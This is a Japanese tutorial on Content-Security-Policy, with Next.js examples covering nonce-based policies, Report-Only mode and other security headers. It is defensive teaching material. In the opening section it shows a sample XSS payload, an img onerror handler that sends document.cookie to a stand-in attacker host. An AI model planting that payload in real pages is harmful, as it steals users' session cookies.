# lesson120: Content-Security-Policy（CSP）実践

## ゴール

- CSP が **XSS の最後の砦** として何を防ぐか説明できる
- `default-src` / `script-src` / `style-src` 等の主要ディレクティブを書ける
- `nonce` / `hash` で **必要な inline script を許可** できる
- `Content-Security-Policy-Report-Only` で本番に出す前の検証ができる
- Next.js で CSP を **proxy + Middleware で動的に発行** できる

::: tip 前提
このレッスンは lesson88「Cookie と Web セキュリティ」の発展編です。XSS / CSRF の基本は lesson88 を確認してください。
:::

## 解説

### CSP は最後の防衛線

XSS の理想は「**そもそも入力をエスケープして XSS を起こさない**」こと（lesson88）。けれど、ライブラリのバグ / Markdown のレンダリング / 古い jQuery など、**完璧に守るのは難しい**。

Content-Security-Policy は「**仮に攻撃スクリプトが混入しても、ブラウザが読み込みを拒否する**」という二重の防衛線です。

仕組みは「**HTTP レスポンスヘッダ** で `<script>` / `<style>` / 画像 / fetch などの **読み込み元を許可リスト形式で指定**」。

### 最小例

```http
Content-Security-Policy: default-src 'self';
```

これだけで:

- 自分のドメイン以外からの **JS / CSS / 画像 / fetch** がブロックされる
- inline script（`<script>...</script>`）も **デフォルト拒否**
- inline style（`<div style="...">`）も拒否

なぜ inline まで拒否するのか:

```html
<!-- 攻撃者が混入させたい -->
<img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)" />
```

これを **inline script 全面禁止** にすると、たとえ XSS で混入しても **実行されません**。

### 主要ディレクティブ

| ディレクティブ | 制御するリソース |
|---|---|
| `default-src` | 他で指定がないリソース全部のフォールバック |
| `script-src` | JavaScript |
| `style-src` | CSS |
| `img-src` | `<img>` |
| `font-src` | フォント |
| `connect-src` | `fetch` / `XMLHttpRequest` / `WebSocket` |
| `frame-src` | `<iframe>` |
| `media-src` | `<audio>` / `<video>` |
| `object-src` | `<object>` / `<embed>`（`'none'` 推奨） |
| `base-uri` | `<base>` タグの `href` |
| `form-action` | `<form>` の `action` |
| `frame-ancestors` | 自分を `<iframe>` で **埋め込ませる相手**（Clickjacking 対策） |

### ソース指定子

| 値 | 意味 |
|---|---|
| `'self'` | 自分のオリジン |
| `'none'` | すべて拒否 |
| `'unsafe-inline'` | inline script / style を許可（**極力避ける**） |
| `'unsafe-eval'` | `eval()` / `new Function()` 許可（**極力避ける**） |
| `https:` | あらゆる HTTPS オリジン |
| `https://example.com` | 個別オリジン |
| `*.example.com` | サブドメインワイルドカード |
| `'nonce-XXXXX'` | ランダムナンス付きの inline を許可 |
| `'sha256-XXXX'` | 特定のハッシュ値の inline を許可 |
| `'strict-dynamic'` | nonce/hash 付きの script から **動的に読み込まれた script** を許可 |

### inline script を許可する 3 つの方法

「Google Analytics や OGP 系の inline `<script>` だけは動かしたい」場合の対応。

#### 1. `'unsafe-inline'`（NG）

`Content-Security-Policy: script-src 'self' 'unsafe-inline';`

→ **すべての inline を許可** してしまうので XSS を防げない。**最終手段**。

#### 2. nonce（推奨）

リクエストごとに **ランダムな文字列**（nonce）をサーバーで生成し:

- ヘッダに `script-src 'nonce-abc123' 'self';`
- `<script nonce="abc123">...</script>`

両方が一致した script だけ実行される。**毎回違う値** なので攻撃者は予測できない。

#### 3. hash

inline script の **SHA-256 ハッシュ** を `script-src 'sha256-XXX'` で許可。**内容が固定** な inline 限定。

### `'strict-dynamic'`

nonce / hash で許可した script が **動的に追加した子 script** をすべて許可する仕組み。許可リストを長く書かずに済む。

```
script-src 'nonce-abc123' 'strict-dynamic';
```

これが現代の **推奨ポリシー** です（Google が CSP Level 3 でプッシュ）。

### `Report-Only` で先に検証

本番に正しい CSP をいきなり当てると **動かなくなるリスク** が高い。`Content-Security-Policy-Report-Only` を使うと:

- ブラウザは **違反をブロックせず**
- 違反を **`report-uri` / `report-to`** に POST してくれる

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-report;
  report-to csp-endpoint;
```

```ts
// app/api/csp-report/route.ts
export async function POST(req: Request) {
  const body = await req.json();
  console.log("CSP violation:", body);
  return new Response(null, { status: 204 });
}
```

数日〜数週間ログを集めて、漏れなく許可リストを揃えてから **本番ヘッダ** に切り替えます。

Sentry や Datadog の **CSP レポート機能** を使うとダッシュボードで一覧できます。

### Next.js での実装

#### 静的なポリシー（next.config.ts のヘッダ）

```ts
// next.config.ts
import type { NextConfig } from "next";

const cspHeader = `
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
`.replace(/\s{2,}/g, " ").trim();

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          { key: "Content-Security-Policy", value: cspHeader },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        ],
      },
    ];
  },
};

export default nextConfig;
```

::: warning Next.js は inline をたくさん使う
Next.js は SSR したマークアップに **inline script を埋め込んで** ハイドレーションを行います。Tailwind v3 までの開発ビルドや next/script の inline モードも inline style / script を生成します。

そのため `'unsafe-inline'` 抜きの厳格な CSP を当てるには **nonce 方式** が必須。
:::

#### 動的なポリシー（Proxy + nonce）

Next.js 16 では `proxy.ts`（旧 middleware.ts）でリクエスト時に nonce を生成し、ヘッダで配ります。

```ts
// proxy.ts
import { NextResponse, type NextRequest } from "next/server";

export function proxy(req: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
  const csp = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;
  `.replace(/\s{2,}/g, " ").trim();

  const requestHeaders = new Headers(req.headers);
  requestHeaders.set("x-nonce", nonce);
  requestHeaders.set("Content-Security-Policy", csp);

  const response = NextResponse.next({ request: { headers: requestHeaders } });
  response.headers.set("Content-Security-Policy", csp);

  return response;
}

export const config = {
  matcher: [
    "/((?!api|_next/static|_next/image|favicon.ico).*)",
  ],
};
```

#### Server Component で nonce を読む

```tsx
// app/layout.tsx
import { headers } from "next/headers";
import Script from "next/script";

export default async function RootLayout({ children }: { children: React.ReactNode }) {
  const nonce = (await headers()).get("x-nonce") ?? undefined;

  return (
    <html lang="ja">
      <body>
        {children}
        <Script
          src="https://example.com/analytics.js"
          nonce={nonce}
          strategy="afterInteractive"
        />
      </body>
    </html>
  );
}
```

`next/script` は **`nonce` prop** を渡すと自動で属性に反映してくれます。

### Trusted Types

CSP の進化版が **Trusted Types**。`document.innerHTML = userInput` のような **危険な代入** を **型レベル** で禁止します。

```
Content-Security-Policy: require-trusted-types-for 'script';
```

未対応ブラウザ（Safari）でも壊れずに、対応ブラウザでさらに守りが厚くなる。**新規プロジェクトは Trusted Types を入れる** が 2026 年の推奨。

### 確認ツール

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)（Google 提供）: 自分の CSP がどれくらい強いかを採点
- [Mozilla Observatory](https://observatory.mozilla.org/): CSP を含むセキュリティヘッダ全般を診断
- ブラウザの DevTools → Network → ヘッダ表示

### CSP 以外のセキュリティヘッダ

| ヘッダ | 役割 |
|---|---|
| `Strict-Transport-Security` | HTTPS 強制 |
| `X-Content-Type-Options: nosniff` | MIME スニッフィング無効化 |
| `Referrer-Policy: strict-origin-when-cross-origin` | リファラーの漏洩抑制 |
| `Permissions-Policy` | カメラ / マイク等の権限を制限 |
| `Cross-Origin-Opener-Policy: same-origin` | Spectre 系対策 |
| `Cross-Origin-Embedder-Policy: require-corp` | 同上 |

CSP と一緒に **これら 5〜6 個も設定** するのが現代の標準。Vercel ダッシュボード / Cloudflare の管理画面で **テンプレート** が用意されています。

### よくある事故

#### 1. Google Fonts / Google Tag Manager が動かない

→ `script-src` / `style-src` / `font-src` / `connect-src` に Google のホスト（`https://fonts.googleapis.com` / `https://fonts.gstatic.com` / `https://www.googletagmanager.com`）を許可する

#### 2. Sentry / Datadog の送信が拒否される

→ `connect-src` に Sentry のエンドポイントを追加

#### 3. 開発時のホットリロードが拒否される

→ 開発時は `connect-src` に `ws://localhost:*` を加える、または開発時は CSP を緩める分岐を入れる

#### 4. iframe 埋め込みされる事故

→ `frame-ancestors 'none'` で防ぐ（X-Frame-Options より上位の指定）

## 演習

### ゴール

- Next.js プロジェクトに **動的 nonce CSP** を入れる
- まず Report-Only で違反ログを取り、最終的に強制ヘッダに切り替える

### 手順 1: 新規プロジェクト

```bash
npx create-next-app@latest csp-sample --ts --app
cd csp-sample
```

### 手順 2: Report-Only で開始

`next.config.ts`:

```ts
const reportOnlyCsp = `
  default-src 'self';
  script-src 'self' 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  frame-ancestors 'none';
  report-uri /api/csp-report;
`.replace(/\s{2,}/g, " ").trim();

export default {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          { key: "Content-Security-Policy-Report-Only", value: reportOnlyCsp },
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
        ],
      },
    ];
  },
};
```

### 手順 3: レポートエンドポイント

`app/api/csp-report/route.ts`:

```ts
export async function POST(req: Request) {
  const text = await req.text();
  console.log("[CSP Report]", text);
  return new Response(null, { status: 204 });
}
```

### 手順 4: わざと違反を起こす

`app/page.tsx`:

```tsx
export default function Home() {
  return (
    <main style={{ padding: 24 }}>
      <h1>CSP Demo</h1>
      <img src="https://example.com/some-image.png" alt="" />
      <iframe src="https://example.com" />
    </main>
  );
}
```

`npm run dev` で開くと、外部画像 / iframe の読み込みが **CSP 違反** として検出され、サーバーログに `[CSP Report]` が出力されるはずです。違反は **ブロックされず**、画面は表示される（Report-Only のため）。

### 手順 5: 動的 nonce に切り替える

`proxy.ts`:

```ts
import { NextResponse, type NextRequest } from "next/server";

export function proxy(req: NextRequest) {
  const nonce = Buffer.from(crypto.randomUUID()).toString("base64");
  const csp = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' data:;
    connect-src 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
  `.replace(/\s{2,}/g, " ").trim();

  const requestHeaders = new Headers(req.headers);
  requestHeaders.set("x-nonce", nonce);

  const res = NextResponse.next({ request: { headers: requestHeaders } });
  res.headers.set("Content-Security-Policy", csp);
  return res;
}

export const config = {
  matcher: [
    "/((?!api|_next/static|_next/image|favicon.ico).*)",
  ],
};
```

`app/layout.tsx`:

```tsx
import { headers } from "next/headers";
import Script from "next/script";

export default async function RootLayout({ children }: { children: React.ReactNode }) {
  const nonce = (await headers()).get("x-nonce") ?? undefined;
  return (
    <html lang="ja">
      <body>
        {children}
        <Script id="hello" nonce={nonce}>
          {`console.log('hello with nonce')`}
        </Script>
      </body>
    </html>
  );
}
```

### 期待出力

- Report-Only モード: 違反は出るがブロックされず、サーバーに `[CSP Report]` ログ
- 動的 nonce モード: `<script nonce="...">` を持つものだけ実行される
- DevTools の Console に CSP 違反があると **赤い警告** が出る

### 変える

- `script-src` の `'strict-dynamic'` を外して、サードパーティ script が読み込めなくなることを確認
- `frame-ancestors 'none'` を `'self'` に変えて、自サイト内の iframe 埋め込みは許可
- Trusted Types を有効化（`require-trusted-types-for 'script'`）して、`innerHTML = userInput` がエラーになることを観察

### 自分で書く（任意）

- Sentry / Datadog の送信が拒否されないよう、`connect-src` に該当エンドポイントを追加
- Google Fonts を使うサイトで `style-src` / `font-src` / `connect-src` を整える
- CSP Evaluator にヘッダを貼って **A 評価** を狙う

## まとめ

- CSP は **XSS の最後の砦**。攻撃 script が混入しても **読み込ませない**
- `default-src 'self'` を起点に、必要に応じてディレクティブを追加
- inline は **`'unsafe-inline'` を避け、nonce / hash + `'strict-dynamic'`** で許可
- **`Content-Security-Policy-Report-Only`** で本番前に違反ログを集める
- Next.js は **proxy** で nonce を発行し、`<Script>` の `nonce` prop で受け渡す
- **Trusted Types** で `innerHTML = userInput` を型レベルで禁止
- CSP と一緒に **STS / X-Content-Type-Options / Referrer-Policy / Permissions-Policy / COOP / COEP** も設定する
- CSP Evaluator / Mozilla Observatory で診断
- 別のレッスンでは **CORS** に進み、API 越しのアクセス制御へ
